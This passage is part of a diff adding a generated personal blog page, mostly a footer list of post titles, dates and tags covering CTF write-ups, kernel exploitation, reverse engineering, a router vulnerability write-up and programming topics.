+<li>[1] - <a href="https://pawnyable.cafe/linux-kernel/">https://pawnyable.cafe/linux-kernel/</a></li>
+<li>[2] - <a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628">https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628</a></li>
+</ul>
+
+
+
+    </div>
+
+    <footer class="content__footer"></footer>
+
+            </section>
+
+            <footer class="page__footer"><ul>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        Jan 2025
+      </span>
+
+      
+      <a href="http://localhost:1313/writeups/irisctf2025-checksumz/">IrisCTF 2025 - Checksumz</a>
+
+      
+      
+
+        <span class="tag__link" style="color: var(--muted);">
+          [
+            
+            <a class="tag__link" href="/tags/exploitation" style="color: var(--logo);">exploitation</a>
+          
+            , 
+            <a class="tag__link" href="/tags/linux_kernel" style="color: var(--logo);">linux_kernel</a>
+          ]
+         
+        </span>
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        Aug 2024
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/tfc-2024/">license - tfc 2024</a>
+
+      
+      
+
+        <span class="tag__link" style="color: var(--muted);">
+          [
+            
+            <a class="tag__link" href="/tags/reverse_engineering" style="color: var(--logo);">reverse_engineering</a>
+          
+            , 
+            <a class="tag__link" href="/tags/ctf" style="color: var(--logo);">ctf</a>
+          ]
+         
+        </span>
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        May 2024
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/hello-2024/">Hello 2024</a>
+
+      
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        Apr 2024
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/umdctf-2024-cmsc430/">umdctf2024 - cmsc430</a>
+
+      
+      
+
+        <span class="tag__link" style="color: var(--muted);">
+          [
+            
+            <a class="tag__link" href="/tags/reverse_engineering" style="color: var(--logo);">reverse_engineering</a>
+          
+            , 
+            <a class="tag__link" href="/tags/ctf" style="color: var(--logo);">ctf</a>
+          ]
+         
+        </span>
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        Apr 2024
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/umdctf-2024-donations-fixed/">umdctf2024 - Donations Fixed</a>
+
+      
+      
+
+        <span class="tag__link" style="color: var(--muted);">
+          [
+            
+            <a class="tag__link" href="/tags/web" style="color: var(--logo);">web</a>
+          
+            , 
+            <a class="tag__link" href="/tags/ctf" style="color: var(--logo);">ctf</a>
+          ]
+         
+        </span>
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        Apr 2024
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/umdctf-2024-donations/">umdctf2024 - Donations</a>
+
+      
+      
+
+        <span class="tag__link" style="color: var(--muted);">
+          [
+            
+            <a class="tag__link" href="/tags/web" style="color: var(--logo);">web</a>
+          
+            , 
+            <a class="tag__link" href="/tags/ctf" style="color: var(--logo);">ctf</a>
+          ]
+         
+        </span>
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        Nov 2023
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/building-a-free-burp-collaborator-with-cloudflare-workers/">Building a free Burp Collaborator with Cloudflare Workers</a>
+
+      
+      
+
+        <span class="tag__link" style="color: var(--muted);">
+          [
+            
+            <a class="tag__link" href="/tags/web" style="color: var(--logo);">web</a>
+          ]
+         
+        </span>
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        Sep 2023
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/thoughts-after-passing-the-oswe/">Thoughts after passing the OSWE</a>
+
+      
+      
+
+        <span class="tag__link" style="color: var(--muted);">
+          [
+            
+            <a class="tag__link" href="/tags/web" style="color: var(--logo);">web</a>
+          ]
+         
+        </span>
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        May 2023
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/cve-2023-33617-writeup/">How I found a 0day in a Brazillian router</a>
+
+      
+      
+
+        <span class="tag__link" style="color: var(--muted);">
+          [
+            
+            <a class="tag__link" href="/tags/vulnerability_research" style="color: var(--logo);">vulnerability_research</a>
+          ]
+         
+        </span>
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        May 2023
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/the-inevitability-of-getting-owned/">The Inevitability of Getting Owned</a>
+
+      
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        Nov 2022
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/getting-hands-dirty-with-hacking/">Getting Hands Dirty with Hacking</a>
+
+      
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        Oct 2022
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/making-and-writing-games/">Making and Writing Games</a>
+
+      
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        Oct 2022
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/pinging-servers-from-recife/">Pinging Servers from Recife</a>
+
+      
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        Sep 2022
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/psychedelic-programming-languages/">Psychedelic Programming Languages</a>
+
+      
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        Sep 2022
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/new-things-here/">New things here</a>
+
+      
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        May 2021
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/c-gems-homoiconicity-in-c/">C Wizardry - Homoiconicity in C</a>
+
+      
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        Apr 2021
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/when-things-are-too-smart/">When Things Are Too Smart</a>
+
+      
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        Feb 2021
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/binbin-tree/">Binary Binary Tree</a>
+
+      
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        Mar 2020
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/mk-lisp-1/">myLisp Interpreter 1: Lexer and Parser</a>
+
+      
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        Mar 2020
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/mk-lisp-0/">myLisp Interpreter 0: What is Lisp?</a>
+
+      
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        Feb 2020
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/obi2018-baldes/">Solução OBI 2018 Baldes</a>
+
+      
+      
+
+        <span class="tag__link" style="color: var(--muted);">
+          [
+            
+            <a class="tag__link" href="/tags/competitive_programming" style="color: var(--logo);">competitive_programming</a>
+          ]
+         
+        </span>
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        Feb 2020
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/obi2018-bolas/">Solução OBI 2018 Bolas</a>
+
+      
+      
+
+        <span class="tag__link" style="color: var(--muted);">
+          [
+            
+            <a class="tag__link" href="/tags/competitive_programming" style="color: var(--logo);">competitive_programming</a>
+          ]
+         
+        </span>
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        Feb 2020
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/obi2018-cinco/">Solução OBI 2018 Cinco</a>
+
+      
+      
+
+        <span class="tag__link" style="color: var(--muted);">
+          [
+            
+            <a class="tag__link" href="/tags/competitive_programming" style="color: var(--logo);">competitive_programming</a>
+          ]
+         
+        </span>
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        Feb 2020
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/obi2018-maximin/">Solução OBI 2018 Maximin</a>
+
+      
+      
+
+        <span class="tag__link" style="color: var(--muted);">
+          [
+            
+            <a class="tag__link" href="/tags/competitive_programming" style="color: var(--logo);">competitive_programming</a>
+          ]
+         
+        </span>
+      
+
+
+    </li>
+  
+    <li>
+      
+      <span class="date text-muted" style="margin-left: 10px;">
+        Feb 2020
+      </span>
+
+      
+      <a href="http://localhost:1313/blog/obi2018-muro/">Solução OBI 2018 Muro</a>
+
+      
+      
+
+        <span class="tag__link" style="color: var(--muted);">
+          [
+            
+            <a class="tag__link" href="/tags/competitive_programming" style="color: var(--logo);">competitive_programming</a>
+          ]
+         
+        </span>
+      
+
+
+    </li>
+  
+</ul>
+<p class="copyright"></p>
+<p class="advertisement">seek knowledge, be kind</p>
+</footer>
+
+        </div>
+    </body>
+
+</html>
